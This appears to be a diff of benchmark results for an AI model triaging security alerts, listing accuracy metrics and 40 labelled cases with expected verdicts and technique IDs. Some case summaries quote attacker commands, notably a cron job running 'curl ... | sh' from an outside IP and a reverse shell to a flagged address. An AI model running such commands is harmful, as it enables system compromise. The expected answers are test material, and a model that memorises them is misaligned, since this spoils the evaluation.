@@ -1,25 +1,47 @@
 {
   "analyst": "claude:claude-opus-5",
-  "cases_labelled": 14,
-  "incidents_produced": 14,
+  "cases_labelled": 40,
+  "incidents_produced": 40,
   "metrics": {
     "correlation_purity": 1.0,
-    "verdict_accuracy": 0.8571428571428571,
-    "severity_exact": 0.7857142857142857,
+    "verdict_accuracy": 0.9,
+    "severity_exact": 0.725,
     "severity_within_one": 1.0,
-    "escalation_precision": 1.0,
+    "escalation_precision": 0.96,
     "escalation_recall": 1.0,
-    "escalation_f1": 1.0,
-    "escalation_false_alarms": 0,
+    "escalation_f1": 0.9795918367346939,
+    "escalation_false_alarms": 1,
     "escalation_misses": 0,
-    "technique_precision": 0.6153846153846154,
-    "technique_recall": 1.0,
-    "technique_f1": 0.761904761904762,
-    "brier": 0.11005,
-    "latency_p50_ms": 31736,
-    "latency_p95_ms": 37577,
-    "cost_total_usd": 0.710176,
-    "cost_per_incident_usd": 0.05072685714285714
+    "technique_precision": 0.4714285714285714,
+    "technique_recall": 0.9166666666666666,
+    "technique_f1": 0.6226415094339622,
+    "brier": 0.085165,
+    "latency_p50_ms": 28523,
+    "latency_p95_ms": 39326,
+    "cost_total_usd": 1.960845,
+    "cost_per_incident_usd": 0.049021125
+  },
+  "intervals": {
+    "escalation_f1": {
+      "low": 0.9268292682926829,
+      "high": 1.0
+    },
+    "verdict_accuracy": {
+      "low": 0.8,
+      "high": 0.975
+    },
+    "severity_exact": {
+      "low": 0.575,
+      "high": 0.85
+    },
+    "technique_f1": {
+      "low": 0.5100671140939597,
+      "high": 0.7285714285714285
+    },
+    "brier": {
+      "low": 0.0493025,
+      "high": 0.12697
+    }
   },
   "cases": [
     {
@@ -32,12 +54,48 @@
       "severity_expected": "informational",
       "escalate": false,
       "escalate_expected": false,
-      "confidence": 0.85,
+      "confidence": 0.88,
+      "techniques": [
+        "T1078.003"
+      ],
+      "techniques_expected": [],
+      "summary": "Key-based SSH login by user natali from an internal address on app02, followed 25 seconds later by an authorised sudo to run 'apt-get upgrade -y' \u2014 routine patching, not attacker activity.",
+      "latency_ms": 17272,
+      "cost_usd": 0.029359
+    },
+    {
+      "case": "ansible_run",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.74,
       "techniques": [],
       "techniques_expected": [],
-      "summary": "Routine administrator session on app02: key-based SSH login by user natali from an internal address followed 25 seconds later by sudo to root running apt-get upgrade.",
-      "latency_ms": 16505,
-      "cost_usd": 0.025184
+      "summary": "Ansible publickey login from an internal management address on db01 followed six seconds later by checksum changes to /etc/mysql/my.cnf and /etc/security/limits.conf \u2014 the signature of a database tuning playbook run, not attacker activity.",
+      "latency_ms": 24607,
+      "cost_usd": 0.040184
+    },
+    {
+      "case": "apt_remove",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.76,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Removal of the `nano` package on app02 produced a dpkg status alert and a matching FIM deletion alert for /usr/bin/nano four seconds later \u2014 a single coherent package-removal event, not attacker activity.",
+      "latency_ms": 19889,
+      "cost_usd": 0.032244
     },
     {
       "case": "apt_upgrade_fim",
@@ -52,9 +110,26 @@
       "confidence": 0.88,
       "techniques": [],
       "techniques_expected": [],
-      "summary": "Three FIM checksum changes on app02 immediately following a dpkg install of libssl3 3.0.13-1 \u2014 all changed paths are files owned by that package set, consistent with a routine OpenSSL package upgrade.",
-      "latency_ms": 15668,
-      "cost_usd": 0.026644
+      "summary": "Package upgrade of libssl3 3.0.13-1 on app02 produced FIM checksum changes on exactly the files that package owns, within 15 seconds of the dpkg install.",
+      "latency_ms": 18648,
+      "cost_usd": 0.028219
+    },
+    {
+      "case": "backup_cron_ok",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.93,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Scheduled root cron job /usr/local/bin/backup.sh on db01 produced a dated backup archive in /backup \u2014 routine nightly database backup, not attacker activity.",
+      "latency_ms": 14831,
+      "cost_usd": 0.024884
     },
     {
       "case": "backup_failure",
@@ -69,9 +144,9 @@
       "confidence": 0.85,
       "techniques": [],
       "techniques_expected": [],
-      "summary": "Two generic syslog error alerts on db01 are a failed rsync backup run (exit status 12) from backup.sh, not security-relevant activity.",
-      "latency_ms": 22518,
-      "cost_usd": 0.046843
+      "summary": "Two level-2 syslog error alerts on db01 are a scheduled backup.sh/rsync job failing at 03:30 with rsync exit status 12, not attacker activity.",
+      "latency_ms": 19086,
+      "cost_usd": 0.031869
     },
     {
       "case": "bruteforce_success",
@@ -86,6 +161,7 @@
       "confidence": 0.93,
       "techniques": [
         "T1078",
+        "T1098",
         "T1110.001",
         "T1136.001",
         "T1548.003"
@@ -96,9 +172,9 @@
         "T1136.001",
         "T1548.003"
       ],
-      "summary": "SSH brute force from 203.0.113.45 against web01 succeeded on the 'backup' account, followed within 90 seconds by sudo to root and creation of a UID 0 backdoor account 'svc_update' on an internet-facing customer web frontend.",
-      "latency_ms": 33899,
-      "cost_usd": 0.075412
+      "summary": "SSH brute force from 203.0.113.45 against web01 succeeded on the 'backup' account, escalated to root via sudo, and created a hidden UID 0 backdoor account (svc_update) within 139 seconds on an internet-exposed customer-facing web frontend.",
+      "latency_ms": 32999,
+      "cost_usd": 0.064064
     },
     {
       "case": "build_churn",
@@ -110,12 +186,29 @@
       "severity_expected": "informational",
       "escalate": false,
       "escalate_expected": false,
-      "confidence": 0.94,
+      "confidence": 0.93,
       "techniques": [],
       "techniques_expected": [],
-      "summary": "FIM alerts on build01 for Maven build artefacts (api.jar, App.class) and a pom.xml modification inside a Jenkins workspace \u2014 a normal CI build, not attacker activity.",
-      "latency_ms": 13474,
-      "cost_usd": 0.021109
+      "summary": "FIM alerts on build01 fired for Maven build outputs (api.jar, App.class) and a pom.xml checksum change inside a Jenkins workspace \u2014 a normal CI build, not attacker activity.",
+      "latency_ms": 13305,
+      "cost_usd": 0.024409
+    },
+    {
+      "case": "certbot_renewal",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.86,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "FIM checksum changes on web01's Let's Encrypt fullchain.pem and privkey.pem immediately followed by a successful certbot.service run \u2014 routine automated certificate renewal.",
+      "latency_ms": 19856,
+      "cost_usd": 0.033054
     },
     {
       "case": "cron_persistence",
@@ -127,7 +220,7 @@
       "severity_expected": "high",
       "escalate": true,
       "escalate_expected": true,
-      "confidence": 0.9,
+      "confidence": 0.92,
       "techniques": [
         "T1053.003",
         "T1059.004",
@@ -138,9 +231,112 @@
         "T1059.004",
         "T1105"
       ],
-      "summary": "On internet-exposed public web frontend web01, service account svc_update replaced its crontab and 41 seconds later a cron job executed `curl -s http://198.18.7.9/p.sh | sh`, pulling and running a remote payload.",
-      "latency_ms": 32944,
-      "cost_usd": 0.056129
+      "summary": "On internet-facing web frontend web01, service account svc_update replaced its crontab and 41 seconds later cron executed `curl -s http://198.18.7.9/p.sh | sh`, pulling and running a remote script.",
+      "latency_ms": 34193,
+      "cost_usd": 0.057379
+    },
+    {
+      "case": "dev_git_push",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.88,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Developer SSH key login to build runner ci02 followed 30 seconds later by creation of a git ORIG_HEAD file in that developer's own project directory \u2014 normal git activity, not attacker behaviour.",
+      "latency_ms": 14041,
+      "cost_usd": 0.026074
+    },
+    {
+      "case": "dns_tunnel",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.86,
+      "techniques": [
+        "T1048.003",
+        "T1071.004",
+        "T1572"
+      ],
+      "techniques_expected": [
+        "T1048.003"
+      ],
+      "summary": "app02's resolver logged 4192 DNS TXT queries in 60 seconds from internal host 10.10.4.30 to a single external domain (data.exfil-c2.net), sustained past the first minute \u2014 the signature of an active DNS tunnel.",
+      "latency_ms": 35771,
+      "cost_usd": 0.063619
+    },
+    {
+      "case": "docker_pull",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.85,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Two FIM 'file added' alerts on Jenkins build runner ci02 for build artefacts (app.jar, lib.so) written inside Docker overlay2 layer directories during a 7-second window.",
+      "latency_ms": 15325,
+      "cost_usd": 0.026029
+    },
+    {
+      "case": "dormant_login",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1021.004",
+        "T1078.002"
+      ],
+      "techniques_expected": [
+        "T1078.002"
+      ],
+      "summary": "First-ever successful SSH password authentication on the crown-jewel domain controller dc01 by an account named `former_admin` from internal host 10.10.1.44 at 01:36 UTC.",
+      "latency_ms": 30575,
+      "cost_usd": 0.068282
+    },
+    {
+      "case": "encoded_command",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": false,
+      "severity": "high",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.76,
+      "techniques": [
+        "T1003.008",
+        "T1027",
+        "T1059.004",
+        "T1140"
+      ],
+      "techniques_expected": [
+        "T1027"
+      ],
+      "summary": "User 'natali' on DMZ application server app02 executed a base64-obfuscated shell command that decodes to a read/enumeration of /etc/shadow, the first time this rule has ever fired on this host.",
+      "latency_ms": 30603,
+      "cost_usd": 0.054909
     },
     {
       "case": "exfil_staging",
@@ -155,18 +351,18 @@
       "confidence": 0.93,
       "techniques": [
         "T1005",
-        "T1030",
         "T1048",
         "T1074.001",
-        "T1548.003"
+        "T1078",
+        "T1560"
       ],
       "techniques_expected": [
         "T1048",
         "T1074.001"
       ],
-      "summary": "Full database dump staged in a hidden /tmp directory on the customer database primary (db01), followed by a sudo mysqldump --all-databases and a ~2.1 GB outbound TCP/443 transfer to a flagged public IP.",
-      "latency_ms": 31736,
-      "cost_usd": 0.057894
+      "summary": "Full database dump staged in a hidden directory on the crown-jewel customer database db01, followed within three minutes by a 2.1 GB outbound transfer over TCP/443 to a public IP on the flagged-indicator list.",
+      "latency_ms": 31818,
+      "cost_usd": 0.059994
     },
     {
       "case": "internet_noise",
@@ -178,26 +374,43 @@
       "severity_expected": "low",
       "escalate": false,
       "escalate_expected": false,
-      "confidence": 0.82,
+      "confidence": 0.78,
       "techniques": [
         "T1110.001"
       ],
       "techniques_expected": [],
-      "summary": "Three failed SSH logins for non-existent generic accounts (root, pi, admin) from three unrelated source IPs over five minutes on internet-facing web01 \u2014 commodity scanning noise, no success.",
-      "latency_ms": 22963,
-      "cost_usd": 0.042504
+      "summary": "Three failed SSH logins for non-existent generic users (root, pi, admin) from three unrelated source IPs against internet-facing web01, with no success and no follow-on activity.",
+      "latency_ms": 21220,
+      "cost_usd": 0.038229
+    },
+    {
+      "case": "kernel_upgrade",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.85,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Kernel package upgrade on app02 (linux-image-5.15.0-91) produced expected FIM checksum changes on the matching /boot kernel and initrd files within 13 seconds.",
+      "latency_ms": 17572,
+      "cost_usd": 0.032584
     },
     {
       "case": "lateral_ssh",
       "pure": true,
-      "verdict": "inconclusive",
+      "verdict": "true_positive",
       "verdict_expected": "true_positive",
-      "verdict_ok": false,
+      "verdict_ok": true,
       "severity": "high",
       "severity_expected": "high",
       "escalate": true,
       "escalate_expected": true,
-      "confidence": 0.6,
+      "confidence": 0.68,
       "techniques": [
         "T1021.004",
         "T1078.003",
@@ -207,9 +420,153 @@
         "T1021.004",
         "T1098.004"
       ],
-      "summary": "An SSH authorized_keys file for the appsvc account on crown-jewel database db01 was modified, followed 74 seconds later by a successful publickey SSH login as appsvc from internal host 10.10.2.15 \u2014 a textbook key-persistence-then-use sequence with no evidence of who wrote the key.",
-      "latency_ms": 37144,
-      "cost_usd": 0.067144
+      "summary": "The appsvc account's SSH authorized_keys file was modified on the crown-jewel customer database db01, and 74 seconds later that account logged in over SSH by public key from an internal host (10.10.2.15) \u2014 a write-then-use key implant pattern, first ever seen on this host.",
+      "latency_ms": 37048,
+      "cost_usd": 0.066294
+    },
+    {
+      "case": "log_tamper",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.86,
+      "techniques": [
+        "T1070.002",
+        "T1078.003",
+        "T1548.003"
+      ],
+      "techniques_expected": [
+        "T1070.002"
+      ],
+      "summary": "Service account svc_update used sudo from an interactive TTY on internet-facing web01 to truncate /var/log/auth.log, and OSSEC confirmed the log was cleared five seconds later.",
+      "latency_ms": 35800,
+      "cost_usd": 0.062034
+    },
+    {
+      "case": "logrotate",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "informational",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.86,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Wazuh flagged /var/log/syslog shrinking on app02 one second before logrotate.service reported success \u2014 routine daily log rotation, not log tampering.",
+      "latency_ms": 16397,
+      "cost_usd": 0.045738
+    },
+    {
+      "case": "mail_relay_abuse",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": false,
+      "severity": "high",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1078",
+        "T1566"
+      ],
+      "techniques_expected": [
+        "T1114.002"
+      ],
+      "summary": "The `marketing` account on DMZ mail gateway mail01 sent 2,210 messages to 2,190 distinct external recipients in a 5-minute window \u2014 first time either bulk-send rule has fired on this host.",
+      "latency_ms": 39326,
+      "cost_usd": 0.068054
+    },
+    {
+      "case": "mass_encrypt",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "critical",
+      "severity_expected": "critical",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.95,
+      "techniques": [
+        "T1485",
+        "T1486"
+      ],
+      "techniques_expected": [
+        "T1486"
+      ],
+      "summary": "Active ransomware encryption of the MySQL data directory on db01 \u2014 3,841 files under /var/lib/mysql renamed to *.LOCKED in 40 seconds, including deletion of the InnoDB system tablespace.",
+      "latency_ms": 21938,
+      "cost_usd": 0.040809
+    },
+    {
+      "case": "monitoring_probe",
+      "pure": true,
+      "verdict": "false_positive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": true,
+      "severity": "informational",
+      "severity_expected": "low",
+      "escalate": false,
+      "escalate_expected": false,
+      "confidence": 0.94,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Two 404 responses on web01 for /healthz from the internal Datadog agent at 10.10.1.20 \u2014 a monitoring health check hitting an endpoint that does not exist.",
+      "latency_ms": 15477,
+      "cost_usd": 0.025659
+    },
+    {
+      "case": "new_geo_login",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": true,
+      "severity": "medium",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1078"
+      ],
+      "techniques_expected": [
+        "T1078"
+      ],
+      "summary": "Single successful OpenVPN authentication for user kpeters from 203.0.113.240 (geo=SG) on the internet-facing VPN concentrator vpn01, with no preceding failures and no baseline for that user's normal source geography.",
+      "latency_ms": 28253,
+      "cost_usd": 0.048914
+    },
+    {
+      "case": "offhours_dbdump",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.55,
+      "techniques": [
+        "T1005",
+        "T1078.003"
+      ],
+      "techniques_expected": [
+        "T1005"
+      ],
+      "summary": "Service account reportsvc used sudo to run `mysqldump --all-databases` as root at 02:36 on db01, the crown-jewel customer PII database, and this rule has never fired on this host before.",
+      "latency_ms": 34094,
+      "cost_usd": 0.060094
     },
     {
       "case": "offhours_login",
@@ -228,9 +585,9 @@
       "techniques_expected": [
         "T1078"
       ],
-      "summary": "Single successful SSH password authentication for user 'dmitri' from public IP 91.203.144.8 to DMZ application server app02 at 01:03 UTC, a rule/behaviour never previously seen on this host.",
-      "latency_ms": 32640,
-      "cost_usd": 0.067833
+      "summary": "First-ever successful SSH password login on DMZ app server app02, account 'dmitri' from public IP 91.203.144.8 at 01:03 UTC, with no preceding failures and no follow-on activity logged.",
+      "latency_ms": 28605,
+      "cost_usd": 0.067733
     },
     {
       "case": "offhours_useradd",
@@ -242,16 +599,42 @@
       "severity_expected": "medium",
       "escalate": true,
       "escalate_expected": true,
-      "confidence": 0.55,
+      "confidence": 0.6,
       "techniques": [
         "T1136.001"
       ],
       "techniques_expected": [
         "T1136.001"
       ],
-      "summary": "A local account `ci_runner2` (UID 1005, /bin/bash) was created on the CI runner build01 at 02:03 UTC with no accompanying authentication, privilege-escalation, or process alerts to explain who created it.",
-      "latency_ms": 37577,
-      "cost_usd": 0.063613
+      "summary": "A local account `ci_runner2` (UID 1005, /bin/bash) was created on CI runner build01 at 02:03 UTC with no accompanying authentication, privilege-escalation, or process alerts to explain who created it.",
+      "latency_ms": 26066,
+      "cost_usd": 0.044964
+    },
+    {
+      "case": "payload_download_exec",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.88,
+      "techniques": [
+        "T1036.005",
+        "T1059.004",
+        "T1105",
+        "T1222.002",
+        "T1564.001"
+      ],
+      "techniques_expected": [
+        "T1105",
+        "T1204.002"
+      ],
+      "summary": "An executable dropped into a hidden directory (/tmp/.x/kworker) on app02 was made executable and run 8 seconds later, masquerading as a kernel worker thread.",
+      "latency_ms": 33036,
+      "cost_usd": 0.057334
     },
     {
       "case": "pkexec_privesc",
@@ -267,34 +650,211 @@
       "techniques": [
         "T1059.004",
         "T1068",
-        "T1548.001",
-        "T1548.003"
+        "T1505.003",
+        "T1548.001"
       ],
       "techniques_expected": [
         "T1548.001"
       ],
-      "summary": "Web service account www-data on DMZ app server app02 obtained an interactive TTY, tried to run /bin/sh as root via sudo, and 37 seconds later crashed the setuid-root pkexec binary \u2014 the signature of a PwnKit-style local privilege escalation attempt following a web-tier compromise.",
-      "latency_ms": 35178,
-      "cost_usd": 0.063179
+      "summary": "The www-data service account on DMZ app server app02 ran an interactive sudo attempt for /bin/sh from a pts TTY and 37 seconds later crashed the setuid-root binary /usr/bin/pkexec with an invalid-opcode kernel trap \u2014 the signature of a post-web-shell local privilege escalation attempt (PwnKit-class).",
+      "latency_ms": 36848,
+      "cost_usd": 0.064304
+    },
+    {
+      "case": "reverse_shell",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "critical",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.93,
+      "techniques": [
+        "T1041",
+        "T1059.004",
+        "T1095",
+        "T1548.003"
+      ],
+      "techniques_expected": [
+        "T1059.004",
+        "T1071.001"
+      ],
+      "summary": "The www-data service account on app02 escalated to root via sudo, spawned an interactive bash reverse shell to a flagged public IP (45.61.184.12:4444), and within 42 seconds the firewall logged outbound data to that same address on the same port.",
+      "latency_ms": 33255,
+      "cost_usd": 0.064209
     },
     {
       "case": "scanner_404s",
       "pure": true,
-      "verdict": "true_positive",
+      "verdict": "false_positive",
       "verdict_expected": "false_positive",
-      "verdict_ok": false,
+      "verdict_ok": true,
       "severity": "low",
       "severity_expected": "low",
       "escalate": false,
       "escalate_expected": false,
-      "confidence": 0.82,
+      "confidence": 0.76,
       "techniques": [
-        "T1595"
+        "T1595.002"
       ],
       "techniques_expected": [],
-      "summary": "Automated vulnerability scanner (zgrab) probed web01 for three well-known RCE paths (PHPUnit eval-stdin, Solr admin, Laravel Ignition) in five seconds; all returned 404.",
-      "latency_ms": 26605,
-      "cost_usd": 0.045859
+      "summary": "Three 404s in five seconds from one source probing well-known PHP/Solr/Laravel exploit paths with a zgrab user agent against the public web frontend web01 \u2014 commodity vulnerability scanning, no successful request.",
+      "latency_ms": 32291,
+      "cost_usd": 0.059909
+    },
+    {
+      "case": "service_crashloop",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "false_positive",
+      "verdict_ok": false,
+      "severity": "medium",
+      "severity_expected": "low",
+      "escalate": true,
+      "escalate_expected": false,
+      "confidence": 0.55,
+      "techniques": [],
+      "techniques_expected": [],
+      "summary": "Dovecot on the DMZ mail gateway mail01 crashed with exit status 1 and entered a restart loop (attempt 3) within a 60-second window, the first time this host has produced this rule.",
+      "latency_ms": 28303,
+      "cost_usd": 0.045879
+    },
+    {
+      "case": "shadow_read",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "critical",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.85,
+      "techniques": [
+        "T1003.008",
+        "T1078.003",
+        "T1548.003"
+      ],
+      "techniques_expected": [
+        "T1003.008"
+      ],
+      "summary": "The ldapsvc service account on domain controller dc01 tried to sudo cat /etc/shadow, was denied, and 18 seconds later successfully read /etc/shadow per the audit PATH record \u2014 first ever occurrence of this rule on this host.",
+      "latency_ms": 40442,
+      "cost_usd": 0.070939
+    },
+    {
+      "case": "single_binary_change",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": true,
+      "severity": "medium",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1554"
+      ],
+      "techniques_expected": [
+        "T1554"
+      ],
+      "summary": "Single FIM alert on app02 (DMZ app server): checksum of /usr/bin/curl changed at 09:42, first time this rule has fired on this host, with no package-manager or session context in the data.",
+      "latency_ms": 29140,
+      "cost_usd": 0.047844
+    },
+    {
+      "case": "sudo_group_add",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "inconclusive",
+      "verdict_ok": true,
+      "severity": "medium",
+      "severity_expected": "medium",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1098"
+      ],
+      "techniques_expected": [
+        "T1098"
+      ],
+      "summary": "Account 'contractor7' was added to the sudo group on app02 (DMZ internal application server) at 18:42 UTC \u2014 first time this rule has fired on this host, with no supporting evidence of who initiated it.",
+      "latency_ms": 24459,
+      "cost_usd": 0.040499
+    },
+    {
+      "case": "sudoers_backdoor",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.9,
+      "techniques": [
+        "T1136.001",
+        "T1548.003"
+      ],
+      "techniques_expected": [
+        "T1136.001",
+        "T1548.003"
+      ],
+      "summary": "A local account 'support' was created on internet-exposed web frontend web01 and granted passwordless root via /etc/sudoers.d/support 20 seconds later \u2014 a textbook persistence plus privilege-escalation backdoor.",
+      "latency_ms": 34334,
+      "cost_usd": 0.062054
+    },
+    {
+      "case": "systemd_persistence",
+      "pure": true,
+      "verdict": "true_positive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": true,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.9,
+      "techniques": [
+        "T1036.005",
+        "T1543.002",
+        "T1564.001"
+      ],
+      "techniques_expected": [
+        "T1543.002"
+      ],
+      "summary": "A new systemd unit (/etc/systemd/system/updater.service) executing a hidden script at /tmp/.boot.sh was created and enabled by the appsvc account on db01, the customer PII database primary.",
+      "latency_ms": 28523,
+      "cost_usd": 0.052079
+    },
+    {
+      "case": "vpn_bruteforce_success",
+      "pure": true,
+      "verdict": "inconclusive",
+      "verdict_expected": "true_positive",
+      "verdict_ok": false,
+      "severity": "high",
+      "severity_expected": "high",
+      "escalate": true,
+      "escalate_expected": true,
+      "confidence": 0.6,
+      "techniques": [
+        "T1078",
+        "T1110.001",
+        "T1133"
+      ],
+      "techniques_expected": [
+        "T1110.001",
+        "T1133"
+      ],
+      "summary": "Two failed OpenVPN authentications for user jsmith from public IP 91.203.144.8 followed 60 seconds later by a successful authentication for the same user from the same IP on the internet-facing VPN concentrator vpn01.",
+      "latency_ms": 32787,
+      "cost_usd": 0.078113
     },
     {
       "case": "webshell",
@@ -306,41 +866,20 @@
       "severity_expected": "high",
       "escalate": true,
       "escalate_expected": true,
-      "confidence": 0.91,
+      "confidence": 0.93,
       "techniques": [
-        "T1059.004",
+        "T1059",
         "T1190",
-        "T1505.003"
+        "T1505.003",
+        "T1595"
       ],
       "techniques_expected": [
         "T1190",
         "T1505.003"
       ],
-      "summary": "Web shell dropped and successfully executed on internet-facing public web frontend web01 after a 95-second scan-to-exploit sequence from 198.51.100.77.",
-      "latency_ms": 29225,
-      "cost_usd": 0.050829
+      "summary": "Interactive web shell planted and executed on internet-facing public web frontend web01 after a 95-second scan-to-exploit sequence from 198.51.100.77.",
+      "latency_ms": 28224,
+      "cost_usd": 0.052004
     }
-  ],
-  "intervals": {
-    "escalation_f1": {
-      "low": 1.0,
-      "high": 1.0
-    },
-    "verdict_accuracy": {
-      "low": 0.6428571428571429,
-      "high": 1.0
-    },
-    "severity_exact": {
-      "low": 0.5714285714285714,
-      "high": 1.0
-    },
-    "technique_f1": {
-      "low": 0.5714285714285715,
-      "high": 0.9166666666666666
-    },
-    "brier": {
-      "low": 0.02762142857142857,
-      "high": 0.21589999999999998
-    }
-  }
+  ]
 }
